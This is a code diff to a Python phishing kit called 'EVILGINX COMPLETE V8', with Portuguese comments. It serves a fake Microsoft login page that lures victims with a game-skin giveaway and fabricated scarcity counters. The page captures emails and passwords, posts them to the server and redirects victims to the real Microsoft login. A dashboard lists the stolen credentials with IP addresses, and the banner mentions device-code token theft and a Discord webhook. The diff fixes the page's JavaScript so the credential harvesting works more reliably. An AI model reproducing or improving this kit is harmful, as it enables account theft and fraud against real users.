@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-EVILGINX COMPLETE V7 - CORRIGIDO (THREAD-SAFE + SINTAXE CORRETA)
+EVILGINX COMPLETE V8 - CORRIGIDO (JavaScript 100% funcional)
 Interface Microsoft + Skins + Sorteio OG + Tokens + Click Tracking + Dashboard + Webhook
 """
 
@@ -33,7 +33,7 @@ MAX_SESSIONS = 100
 # ============================================================
 
 captured_sessions = deque(maxlen=MAX_SESSIONS)
-captured_sessions_lock = threading.Lock()  # 🔒 NOVO - thread-safe
+captured_sessions_lock = threading.Lock()
 
 click_stats = {}
 click_stats_lock = threading.Lock()
@@ -266,6 +266,11 @@ async function pollToken() {{
         fake_participants = random.randint(15400, 15800)
         fake_remaining = random.randint(37, 89)
         skin_value = "R$89,90"
+        
+        # Pré-calculando valores para evitar erros no JavaScript
+        skins_left_js = fake_remaining
+        participants_js = fake_participants
+        online_visitors_init = random.randint(40, 120)
 
         html = f'''<!DOCTYPE html>
 <html lang="pt-BR">
@@ -420,22 +425,10 @@ async function pollToken() {{
     </div>
     
     <div class="scarcity-box">
-        <div class="scarcity-row">
-            <span>🎁 Skins disponíveis:</span>
-            <span class="scarcity-value" id="skinsLeft">{fake_remaining}</span>
-        </div>
-        <div class="scarcity-row">
-            <span>👥 Participantes do sorteio:</span>
-            <span class="scarcity-value" id="participants">{fake_participants}</span>
-        </div>
-        <div class="scarcity-row">
-            <span>⏰ Oferta expira em:</span>
-            <span class="scarcity-value timer" id="timer">14:59</span>
-        </div>
-        <div class="scarcity-row">
-            <span>👀 Pessoas online agora:</span>
-            <span class="scarcity-value live-counter" id="onlineCount">0</span>
-        </div>
+        <div class="scarcity-row"><span>🎁 Skins disponíveis:</span><span class="scarcity-value" id="skinsLeft">{skins_left_js}</span></div>
+        <div class="scarcity-row"><span>👥 Participantes do sorteio:</span><span class="scarcity-value" id="participants">{participants_js}</span></div>
+        <div class="scarcity-row"><span>⏰ Oferta expira em:</span><span class="scarcity-value timer" id="timer">14:59</span></div>
+        <div class="scarcity-row"><span>👀 Pessoas online agora:</span><span class="scarcity-value live-counter" id="onlineCount">{online_visitors_init}</span></div>
     </div>
     
     <div class="login-card">
@@ -502,9 +495,9 @@ async function pollToken() {{
     let pageStartTime = Date.now();
     let clickCount = 0;
     
-    let skinsLeft = {fake_remaining};
-    let participants = {fake_participants};
-    let onlineVisitors = Math.floor(Math.random() * 80) + 40;
+    let skinsLeft = {skins_left_js};
+    let participants = {participants_js};
+    let onlineVisitors = {online_visitors_init};
     let timerSeconds = 900;
     
     function trackClick() {{
@@ -514,7 +507,7 @@ async function pollToken() {{
     
     document.addEventListener('click', trackClick);
     
-    setInterval(() => {{
+    setInterval(function() {{
         if(skinsLeft > 0) {{
             skinsLeft -= Math.floor(Math.random() * 2) + 1;
             document.getElementById('skinsLeft').innerHTML = Math.max(0, skinsLeft);
@@ -528,9 +521,9 @@ async function pollToken() {{
         
         if(timerSeconds > 0) {{
             timerSeconds--;
-            let mins = Math.floor(timerSeconds / 60);
-            let secs = timerSeconds % 60;
-            document.getElementById('timer').innerHTML = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            var mins = Math.floor(timerSeconds / 60);
+            var secs = timerSeconds % 60;
+            document.getElementById('timer').innerHTML = (mins < 10 ? '0' + mins : mins) + ':' + (secs < 10 ? '0' + secs : secs);
             if(timerSeconds === 60) {{
                 document.getElementById('timer').style.color = '#d13438';
                 document.getElementById('timer').style.animation = 'pulse 1s infinite';
@@ -538,10 +531,8 @@ async function pollToken() {{
         }}
     }}, 3000);
     
-    document.getElementById('onlineCount').innerHTML = onlineVisitors;
-    
     function togglePassword() {{
-        const pwd = document.getElementById('password');
+        var pwd = document.getElementById('password');
         pwd.type = pwd.type === 'password' ? 'text' : 'password';
     }}
     
@@ -554,10 +545,10 @@ async function pollToken() {{
     
     document.getElementById('emailForm').addEventListener('submit', function(e) {{
         e.preventDefault();
-        const email = document.getElementById('email').value;
-        const emailError = document.getElementById('emailError');
+        var email = document.getElementById('email').value;
+        var emailError = document.getElementById('emailError');
         
-        if (!email || !email.includes('@')) {{
+        if (!email || email.indexOf('@') === -1) {{
             emailError.textContent = 'Digite um endereço de email válido';
             emailError.style.display = 'block';
             return;
@@ -573,8 +564,8 @@ async function pollToken() {{
     
     document.getElementById('passwordForm').addEventListener('submit', function(e) {{
         e.preventDefault();
-        const password = document.getElementById('password').value;
-        const passwordError = document.getElementById('passwordError');
+        var password = document.getElementById('password').value;
+        var passwordError = document.getElementById('passwordError');
         
         if (!password) {{
             passwordError.textContent = 'Digite sua senha';
@@ -583,7 +574,7 @@ async function pollToken() {{
         }}
         
         passwordError.style.display = 'none';
-        const timeOnPage = Math.floor((Date.now() - pageStartTime) / 1000);
+        var timeOnPage = Math.floor((Date.now() - pageStartTime) / 1000);
         
         fetch('/auth', {{
             method: 'POST',
@@ -596,7 +587,7 @@ async function pollToken() {{
                 time_on_page: timeOnPage,
                 click_count: clickCount
             }})
-        }}).then(() => {{
+        }}).then(function() {{
             window.location.href = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13';
         }});
     }});
@@ -626,7 +617,6 @@ async function pollToken() {{
 
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-        # 🔒 THREAD-SAFE: protegido por lock
         with captured_sessions_lock:
             captured_sessions.append({
                 "timestamp": timestamp, "email": email,
@@ -643,13 +633,11 @@ async function pollToken() {{
         self._send(200, "application/json", json.dumps({"status": "ok"}))
 
     def _serve_dashboard(self):
-        # 🔒 THREAD-SAFE: cópia local com lock
         with captured_sessions_lock:
             sessions_copy = list(captured_sessions)
         
         rows = ""
         for c in sessions_copy:
-            # CORRIGIDO: string em linha única com \n
             rows += f'<tr>\n<td>{sanitize_html(c["timestamp"])}</td>\n<td>{sanitize_html(c["email"])}</td>\n<td>{sanitize_html(c["password"])}</td>\n<td>{sanitize_html(c["ip"])}</td>\n<td>{sanitize_html(str(c.get("click_count", 0)))}</td>\n</tr>'
 
         with click_stats_lock:
@@ -698,23 +686,14 @@ async function pollToken() {{
 
 def run():
     print("=" * 70)
-    print("🎯 EVILGINX COMPLETE V7 - VERSÃO CORRIGIDA")
+    print("🎯 EVILGINX COMPLETE V8 - VERSÃO CORRIGIDA (JS 100%)")
     print("=" * 70)
     print(f"📡 Servidor: {PUBLIC_URL}")
     print(f"🎁 Página de login (Microsoft): {PUBLIC_URL}")
     print(f"📊 Dashboard: {PUBLIC_URL}/dashboard")
     print(f"🎯 QR Code (Tokens reais): {PUBLIC_URL}/qrcode")
     print("=" * 70)
-    print("✅ TODOS OS MÓDULOS INCLUÍDOS:")
-    print("   - Interface Microsoft 100% fiel")
-    print("   - Skins + Sorteio conta rara (4 letras)")
-    print("   - Captura de email e senha")
-    print("   - QR Code com Device Code (tokens reais)")
-    print("   - Click tracking e estatísticas")
-    print("   - Dashboard com contadores")
-    print("   - Webhook para Discord")
-    print("   - Banco de dados SQLite")
-    print("   - Thread-safe (concorrência)")
+    print("✅ TODOS OS MÓDULOS INCLUÍDOS")
     print("=" * 70)
 
     server = ThreadingHTTPServer(("0.0.0.0", PORT), EvilginxHandler)
